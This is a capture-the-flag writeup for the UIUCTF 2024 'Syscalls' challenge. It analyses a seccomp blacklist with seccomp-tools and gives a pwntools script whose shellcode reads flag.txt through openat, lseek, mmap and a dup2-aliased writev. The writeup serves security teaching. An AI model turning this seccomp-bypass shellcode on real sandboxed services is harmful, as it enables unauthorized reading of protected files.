---
title: "Syscalls - UIUCTF 2024"
category: "pwn"
subcategory: "seccomp"
type: "writeup"
tags: ["pwn", "seccomp", "buffer-overflow", "shellcode", "syscalls", "uiuctf", "uiuctf-2024", "2024", "ctf-writeup"]
summary: "\\- Identify SECCOMP filter rules (using seccomp-tools) and list up the allowed system calls"
source:
  name: "CTFtime writeup #39292"
  url: "https://ctftime.org/writeup/39292"
ctf:
  name: "UIUCTF 2024"
  year: 2024
  challenge: "Syscalls"
---

## Metadata

- **CTF:** UIUCTF 2024
- **Task:** Syscalls
- **Author team:** G1nh0n9
- **CTFtime tags:** seccomp
- **CTFtime:** <https://ctftime.org/writeup/39292>

---
# Key Strategies

\- Identify SECCOMP filter rules (using seccomp-tools) and list up the allowed system calls

\- Create a shellcode that can “open”, “read”, and “write” the flag.txt

\---

# Solution

** Some items are pre-analyzed and explained based on that analysis **

** Function names and variable names used in the analysis are arbitrary **

1\. main function  
  
```c  
unsigned __int64 __fastcall main(int a1, char **a2, char **a3)  
{  
char shellcode[184]; // [rsp+0h] [rbp-C0h] BYREF  
unsigned __int64 v5; // [rsp+B8h] [rbp-8h]  
  
v5 = __readfsqword(0x28u);  
setvbuf(stdout, 0LL, 2, 0LL);  
setvbuf(stderr, 0LL, 2, 0LL);  
setvbuf(stdin, 0LL, 2, 0LL);  
get_shellcode(shellcode);  
set_seccomp();  
run_shellcode((__int64 (*)(void))shellcode);  
return v5 - __readfsqword(0x28u);  
}  
```  
  
The main function receives shellcode, sets SECCOMP rules, and then runs the shellcode.   
  
Generally, it is impossible to override SECCOMP rules once set(~~I tried it~~). Thus, we need to read the flag using system calls allowed by SECCOMP rules.  
  
\---  
  
2\. sub_1280(get_shellcode)  
  
```c  
char *__fastcall sub_1280(char *a1)  
{  
puts(  
"The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.");  
return fgets(a1, 176, stdin);  
}  
```  
  
This function receives 176 characters. Since fgets receives n-1 characters, it actually receives 175 characters.   
Since the shellcode buffer size is 184, there is no buffer overflow issue.  
  
\---  
  
3\. sub_12DB(set_seccomp)  
  
```c  
__int64 sub_12DB()  
{  
unsigned __int16 len; // [rsp+10h] [rbp-E0h] BYREF  
__int64 *filter; // [rsp+18h] [rbp-D8h]  
__int64 v3[26]; // [rsp+20h] [rbp-D0h] BYREF  
  
v3[25] = __readfsqword(0x28u);  
v3[0] = 0x400000020LL;  
v3[1] = 0xC000003E16000015LL;  
v3[2] = 32LL;  
v3[3] = 0x4000000001000035LL;  
v3[4] = -3976200171LL;  
v3[5] = 1179669LL;  
v3[6] = 0x100110015LL;  
v3[7] = 0x200100015LL;  
v3[8] = 0x11000F0015LL;  
v3[9] = 0x13000E0015LL;  
v3[10] = 0x28000D0015LL;  
v3[11] = 0x39000C0015LL;  
v3[12] = 0x3B000B0015LL;  
v3[13] = 0x113000A0015LL;  
v3[14] = 0x12700090015LL;  
v3[15] = 0x12800080015LL;  
v3[16] = 0x14200070015LL;  
v3[17] = 0x1405000015LL;  
v3[18] = 0x1400000020LL;  
v3[19] = 0x30025LL;  
v3[20] = 0x3000015LL;  
v3[21] = 0x1000000020LL;  
v3[22] = 0x3E801000025LL;  
v3[23] = 0x7FFF000000000006LL;  
v3[24] = 6LL;  
len = 25;  
filter = v3;  
prctl(PR_SET_NO_NEW_PRIVS, 1LL, 0LL, 0LL, 0LL);  
return (unsigned int)prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &len;;  
}  
```  
  
The prctl function sets SECCOMP rules. We can analyze the SECCOMP rules assigned to the variable using seccomp-tools.  
  
```bash  
$ ~/.gem/bin/seccomp-tools dump ./syscalls  
The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.  
a  
line CODE JT JF K  
=================================  
0000: 0x20 0x00 0x00 0x00000004 A = arch  
0001: 0x15 0x00 0x16 0xc000003e if (A != ARCH_X86_64) goto 0024  
0002: 0x20 0x00 0x00 0x00000000 A = sys_number  
0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005  
0004: 0x15 0x00 0x13 0xffffffff if (A != 0xffffffff) goto 0024  
0005: 0x15 0x12 0x00 0x00000000 if (A == read) goto 0024  
0006: 0x15 0x11 0x00 0x00000001 if (A == write) goto 0024  
0007: 0x15 0x10 0x00 0x00000002 if (A == open) goto 0024  
0008: 0x15 0x0f 0x00 0x00000011 if (A == pread64) goto 0024  
0009: 0x15 0x0e 0x00 0x00000013 if (A == readv) goto 0024  
0010: 0x15 0x0d 0x00 0x00000028 if (A == sendfile) goto 0024  
0011: 0x15 0x0c 0x00 0x00000039 if (A == fork) goto 0024  
0012: 0x15 0x0b 0x00 0x0000003b if (A == execve) goto 0024  
0013: 0x15 0x0a 0x00 0x00000113 if (A == splice) goto 0024  
0014: 0x15 0x09 0x00 0x00000127 if (A == preadv) goto 0024  
0015: 0x15 0x08 0x00 0x00000128 if (A == pwritev) goto 0024  
0016: 0x15 0x07 0x00 0x00000142 if (A == execveat) goto 0024  
0017: 0x15 0x00 0x05 0x00000014 if (A != writev) goto 0023  
0018: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # writev(fd, vec, vlen)  
0019: 0x25 0x03 0x00 0x00000000 if (A > 0x0) goto 0023  
0020: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0024  
0021: 0x20 0x00 0x00 0x00000010 A = fd # writev(fd, vec, vlen)  
0022: 0x25 0x00 0x01 0x000003e8 if (A <= 0x3e8) goto 0024  
0023: 0x06 0x00 0x00 0x7fff0000 return ALLOW  
0024: 0x06 0x00 0x00 0x00000000 return KILL  
```  
  
`writev` has some restrictions, and other syscalls are blocked.  
  
4\. Scenario  
  
To bypass the SECCOMP rules, we can plan the following scenario and pre requirements:  
  
1\. Open the file (openat)  
  
*Although relative paths can be used, it did not work, so I checked with Dockerfile and getcwd to get the absolute path.  
  
2\. Read (mmap)  
1\. file size required  
  
Calculate file size using lseek.  
  
3\. Write (writev)  
1\. fd deception  
  
Alias fd using dup2.  
  
2\. struct iovec  
  
Create iovec structure on the stack.  
  
5\. Based on the above scenario, we can create the following exploit code:

```python  
from pwn import *  
context(arch='amd64', os='linux', log_level='debug')

p = remote('[syscalls.chal.uiuc.tf](http://syscalls.chal.uiuc.tf)', 1337, ssl=True)

# set fd 0x3f9 as alias of fd 0x1  
shellcode = shellcraft.dup2(1, 0x3f9)  
# open file using absolute path  
shellcode += shellcraft.openat(-1, '/home/user/flag.txt', 0)  
# get flag size  
shellcode += shellcraft.lseek(3, 0, 2)  
# save flag size into rbx (*caution: you have to aware 'rbx' not to be modified)  
shellcode += shellcraft.mov('rbx', 'rax')  
# read flag using mmap ('rbx': flag size)  
shellcode += shellcraft.mmap(0, 'rbx', 3, 2, 3, 0)  
# writev systemcall with force pusing struct iovec  
shellcode += """  
mov rdi, 0x3f9  
sub rsp, 16  
mov [rsp], rax  
mov [rsp + 8], rbx  
mov rsi, rsp  
mov rdx, 1  
mov rax, 20   
syscall  
"""

payload = asm(shellcode)  
# padding  
payload += b"\x90" * (0x100 - len(payload))

p.recvuntil(b"The flag is in a file named flag.txt located in the same directory as this binary. That's all the information I can give you.")  
p.send(payload)

p.interactive()  
```

\---

# Why is this vulunerable?

While SECCOMP blocks general system calls, the blacklist approach is not sufficient to protect against vulnerabilities outside the developer's knowledge domain. This can be improved with a whitelist approach.
